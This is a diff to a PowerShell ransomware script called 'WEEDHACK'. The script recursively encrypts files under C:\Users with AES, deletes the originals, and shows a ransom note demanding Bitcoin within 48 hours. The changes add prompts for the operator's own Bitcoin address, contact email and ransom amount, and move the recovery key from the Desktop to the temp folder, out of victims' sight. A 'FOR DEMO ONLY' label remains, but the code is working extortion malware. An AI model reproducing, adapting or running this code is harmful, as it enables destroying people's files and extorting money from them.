@@ -1,3 +1,31 @@
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "     WEEDHACK SETUP                    " -ForegroundColor Cyan
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+$btcAddress = Read-Host "Enter YOUR Bitcoin address for ransom payments"
+$contactEmail = Read-Host "Enter YOUR contact email (or press Enter for default)"
+$ransomAmount = Read-Host "Enter ransom amount in BTC (or press Enter for 0.25)"
+
+if ([string]::IsNullOrWhiteSpace($contactEmail)) {
+    $contactEmail = "weedhack@onionmail.org"
+}
+if ([string]::IsNullOrWhiteSpace($ransomAmount)) {
+    $ransomAmount = "0.25"
+}
+
+Write-Host ""
+Write-Host "Bitcoin Address: $btcAddress" -ForegroundColor Yellow
+Write-Host "Contact: $contactEmail" -ForegroundColor Yellow
+Write-Host "Amount: $ransomAmount BTC" -ForegroundColor Yellow
+Write-Host ""
+
+$confirm = Read-Host "Proceed with encryption? (yes/no)"
+if ($confirm -ne "yes") {
+    Write-Host "Operation cancelled." -ForegroundColor Red
+    exit
+}
+
+
 $Target = "C:\Users"
 $Extension = ".weedhack"
 $Delay = 30
@@ -9,13 +37,11 @@ Write-Host "       Extension: $Extension            " -ForegroundColor Red
 Write-Host "       Targets: $($FileTypes.Count) file types" -ForegroundColor Red
 Write-Host "========================================" -ForegroundColor Red
 
-
 $aes = [System.Security.Cryptography.Aes]::Create()
 $key = $aes.Key
 $iv = $aes.IV
 $encryptor = $aes.CreateEncryptor()
 $count = 0
-
 
 Write-Host "Scanning for target files..." -ForegroundColor Yellow
 $files = @()
@@ -30,20 +56,13 @@ Get-ChildItem $Target -Recurse -File -ErrorAction SilentlyContinue |
 
 Write-Host "Found $($files.Count) target files" -ForegroundColor Yellow
 
-
 Write-Host "Encrypting files..." -ForegroundColor Yellow
 foreach ($filePath in $files) {
     try {
- 
         $data = [IO.File]::ReadAllBytes($filePath)
         $encrypted = $encryptor.TransformFinalBlock($data, 0, $data.Length)
-        
-
         [IO.File]::WriteAllBytes($filePath + $Extension, $iv + $encrypted)
-        
-
         [IO.File]::Delete($filePath)
-        
         $count++
         if ($count % 500 -eq 0) { 
             Write-Host "[$count/$($files.Count)]" -NoNewline 
@@ -51,18 +70,16 @@ foreach ($filePath in $files) {
             Write-Host "." -NoNewline
         }
     } catch {
-     
         continue
     }
 }
 
 Write-Host "`n`nEncrypted $count/$($files.Count) files with $Extension" -ForegroundColor Green
 
-
 $keyB64 = [Convert]::ToBase64String($key)
 $ivB64 = [Convert]::ToBase64String($iv)
-"WEEDHACK RECOVERY KEY`n=====================`nAES Key (Base64): $keyB64`nAES IV (Base64): $ivB64`nFiles: $count`nExtension: $Extension" | 
-    Out-File "$env:USERPROFILE\Desktop\WEEDHACK_RECOVERY_KEY.txt"
+"WEEDHACK RECOVERY KEY`n=====================`nAES Key (Base64): $keyB64`nAES IV (Base64): $ivB64`nFiles: $count`nExtension: $Extension`nPayment Address: $btcAddress`nAmount: $ransomAmount BTC`nContact: $contactEmail" | 
+    Out-File "$env:TEMP\WEEDHACK_RECOVERY_KEY.txt"
 
 
 Add-Type -AssemblyName System.Windows.Forms
@@ -89,7 +106,7 @@ $label2.Font = New-Object Drawing.Font("Arial", 10)
 $form.Controls.Add($label2)
 
 $label3 = New-Object Windows.Forms.Label
-$label3.Text = "Send 0.25 BTC to: bc1qweedhackaddressxxxxxxxxxxxxx"
+$label3.Text = "Send $ransomAmount BTC to: $btcAddress"
 $label3.AutoSize = $true
 $label3.Location = New-Object Drawing.Size(20, 90)
 $label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
@@ -97,7 +114,7 @@ $form.Controls.Add($label3)
 
 $textbox = New-Object Windows.Forms.TextBox
 $textbox.Multiline = $true
-$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`nContact: weedhack@onionmail.org`nPayment address: bc1qweedhackaddressxxxxxxxxxxxxx`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
+$textbox.Text = "All your documents, images, videos, and archives have been encrypted with AES-256.`n`nTo recover your files, you must pay $ransomAmount BTC within 48 hours.`n`nContact: $contactEmail`nPayment address: $btcAddress`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
 $textbox.Size = New-Object Drawing.Size(650, 180)
 $textbox.Location = New-Object Drawing.Size(20, 120)
 $textbox.ReadOnly = $true
@@ -127,3 +144,4 @@ $form.Add_Shown({
 
 Write-Host "Ransom note displayed for $Delay seconds" -ForegroundColor Yellow
 Write-Host "Recovery key saved to Desktop (FOR DEMO ONLY)" -ForegroundColor Yellow
+Write-Host "Your Bitcoin address: $btcAddress" -ForegroundColor Green
